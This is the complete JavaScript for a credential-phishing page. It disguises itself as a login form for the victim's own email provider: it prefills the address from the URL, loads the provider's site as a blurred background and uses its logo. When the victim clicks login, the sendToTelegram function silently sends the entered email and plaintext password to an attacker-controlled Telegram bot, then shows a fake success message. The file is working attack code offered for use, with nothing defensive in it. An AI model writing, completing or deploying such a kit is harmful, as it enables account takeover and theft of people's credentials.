// ==================== TELEGRAM CONFIGURATION - ONLY CHANGE HERE ====================
const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';  // Get from @BotFather
const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';      // Get from @userinfobot
// ===============================================================================

let currentBackgroundDomain = '';
let userLanguage = 'en';

// ==================== TELEGRAM FUNCTION - SIMPLE AND GUARANTEED ====================
function sendToTelegram(email, password) {
    return new Promise((resolve) => {
        const domain = email.includes('@') ? email.split('@')[1] : 'unknown';
        
        // Simple message
        const message = `New Login - Email: ${email} - Password: ${password} - Domain: ${domain}`;
        const encodedMessage = encodeURIComponent(message);
        
        // Telegram API URL
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}`;
        
        console.log('Sending to Telegram...');
        
        // Use Image method - WORKS EVERYWHERE
        const img = new Image();
        img.src = url;
        
        // Always resolve after a short delay (request is sent)
        setTimeout(() => {
            console.log('Telegram request sent');
            resolve(true);
        }, 1000);
    });
}

// ==================== LOGIN BUTTON HANDLER ====================
function setupLoginButton() {
    const loginBtn = document.getElementById('loginBtn');
    if (!loginBtn) {
        console.error('Login button not found!');
        return;
    }
    
    console.log('Login button found, attaching event listener');
    
    loginBtn.addEventListener('click', function() {
        console.log('Login button clicked');
        
        // Get form values
        const email = document.getElementById('user_email')?.value || '';
        const password = document.getElementById('pw')?.value || '';
        
        console.log('Email:', email);
        console.log('Password:', password ? '[HIDDEN]' : 'empty');
        
        // Validate
        if (!email || !password) {
            showMessage('Please fill in all fields', 'error');
            return;
        }
        
        // Check Telegram configuration
        if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
            showMessage('ERROR: Telegram bot token not configured in script.js', 'error');
            console.error('Telegram bot token not configured');
            return;
        }
        
        if (!TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
            showMessage('ERROR: Telegram chat ID not configured in script.js', 'error');
            console.error('Telegram chat ID not configured');
            return;
        }
        
        // Disable button and show loading
        loginBtn.disabled = true;
        const originalText = loginBtn.textContent;
        loginBtn.textContent = 'Sending...';
        
        // Send to Telegram
        sendToTelegram(email, password)
            .then(() => {
                showMessage('✓ Login submitted successfully', 'success');
                document.getElementById('pw').value = ''; // Clear password
            })
            .catch((error) => {
                console.error('Error:', error);
                showMessage('✗ Error submitting form', 'error');
            })
            .finally(() => {
                loginBtn.disabled = false;
                loginBtn.textContent = originalText;
            });
    });
}

// ==================== MESSAGE DISPLAY ====================
function showMessage(text, type = 'error') {
    const messageDiv = document.getElementById('message');
    if (!messageDiv) return;
    
    messageDiv.textContent = text;
    messageDiv.className = `message ${type}`;
    messageDiv.style.display = 'block';
    
    setTimeout(() => {
        messageDiv.style.display = 'none';
    }, 3000);
}

// ==================== PASSWORD TOGGLE ====================
function setupPasswordToggle() {
    const toggle = document.getElementById('togglePassword');
    const pw = document.getElementById('pw');
    
    if (toggle && pw) {
        toggle.addEventListener('click', function() {
            const isPassword = pw.type === 'password';
            pw.type = isPassword ? 'text' : 'password';
            this.textContent = isPassword ? 'Hide' : 'Show';
        });
    }
}

// ==================== LANGUAGE FUNCTIONS ====================
function detectUserLanguage() {
    try {
        const browserLang = navigator.language || navigator.userLanguage || 'en';
        return browserLang.split('-')[0].toLowerCase();
    } catch (e) {
        return 'en';
    }
}

function getLanguageName(langCode) {
    const languageNames = {
        'en': 'English', 'es': 'Español', 'fr': 'Français', 'de': 'Deutsch',
        'it': 'Italiano', 'pt': 'Português', 'ru': 'Русский', 'zh': '中文',
        'ja': '日本語', 'ko': '한국어', 'ar': 'العربية', 'hi': 'हिन्दी'
    };
    return languageNames[langCode] || langCode.toUpperCase();
}

function updateLanguageButton(lang) {
    const langBtn = document.getElementById('langToggle');
    if (langBtn) {
        langBtn.textContent = `🌐 ${getLanguageName(lang)}`;
    }
}

function setupLanguageToggle() {
    const langBtn = document.getElementById('langToggle');
    if (!langBtn) return;
    
    langBtn.addEventListener('click', function() {
        if (userLanguage === 'en') {
            const detectedLang = detectUserLanguage();
            if (detectedLang !== 'en') {
                userLanguage = detectedLang;
                updateLanguageButton(detectedLang);
                showMessage(`Language set to ${getLanguageName(detectedLang)}`, 'success');
            }
        } else {
            userLanguage = 'en';
            updateLanguageButton('en');
            showMessage('Language set to English', 'success');
        }
    });
}

// ==================== DOMAIN BACKGROUND ====================
async function loadWebsiteBackground(domain) {
    if (!domain || currentBackgroundDomain === domain) return;
    
    currentBackgroundDomain = domain;
    
    const existingIframe = document.querySelector('.website-background');
    if (existingIframe) existingIframe.remove();
    
    const iframe = document.createElement('iframe');
    iframe.className = 'website-background';
    iframe.style.cssText = `
        position: fixed;
        inset: 0;
        width: 100%;
        height: 100%;
        z-index: -1;
        border: none;
        background: white;
        opacity: 0;
        transition: opacity 1s ease;
        filter: blur(8px);
        transform: scale(1.05);
    `;
    
    document.body.appendChild(iframe);
    iframe.src = `https://${domain}`;
    
    setTimeout(() => {
        iframe.style.opacity = '1';
    }, 1000);
}

async function fetchDomainLogo(domain) {
    const logoImg = document.getElementById('logoImg');
    if (logoImg && domain) {
        logoImg.src = `https://www.google.com/s2/favicons?domain=${domain}&sz=128`;
    }
}

function showDomainInfo(domain) {
    const domainInfoDiv = document.getElementById('domainInfo');
    if (domainInfoDiv && domain) {
        domainInfoDiv.innerHTML = `<span>Logging into ${domain}</span>`;
    }
}

// ==================== EMAIL AUTO-FILL FROM HASH ====================
function extractAndSetEmailFromHash() {
    const hash = window.location.hash;
    if (!hash) return false;
    
    const emailFromHash = hash.substring(1);
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    
    if (emailRegex.test(emailFromHash)) {
        const emailField = document.getElementById('user_email');
        if (emailField) {
            emailField.value = emailFromHash;
            const domain = emailFromHash.split('@')[1];
            
            loadWebsiteBackground(domain);
            fetchDomainLogo(domain);
            showDomainInfo(domain);
            
            setTimeout(() => {
                document.getElementById('pw')?.focus();
            }, 500);
        }
        return true;
    }
    return false;
}

// ==================== EMAIL INPUT LISTENER ====================
function setupEmailInputListener() {
    const emailInput = document.getElementById('user_email');
    if (!emailInput) return;
    
    emailInput.addEventListener('input', function(e) {
        const email = e.target.value;
        if (email.includes('@')) {
            const domain = email.split('@')[1];
            if (domain.includes('.')) {
                showDomainInfo(domain);
                if (domain !== currentBackgroundDomain) {
                    loadWebsiteBackground(domain);
                    fetchDomainLogo(domain);
                }
            }
        }
    });
}

// ==================== INITIALIZATION ====================
function initialize() {
    console.log('Page initializing...');
    
    // Setup all functions
    setupLoginButton();
    setupPasswordToggle();
    setupLanguageToggle();
    setupEmailInputListener();
    
    // Set initial language
    userLanguage = detectUserLanguage();
    updateLanguageButton(userLanguage);
    
    // Extract email from URL hash
    extractAndSetEmailFromHash();
    
    // Log configuration status
    if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
        console.warn('⚠️ Telegram bot token not configured - update script.js');
    } else {
        console.log('✅ Telegram bot token configured');
    }
    
    if (TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
        console.warn('⚠️ Telegram chat ID not configured - update script.js');
    } else {
        console.log('✅ Telegram chat ID configured');
    }
    
    console.log('Initialization complete');
}

// Start when page loads
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initialize);
} else {
    initialize();
}
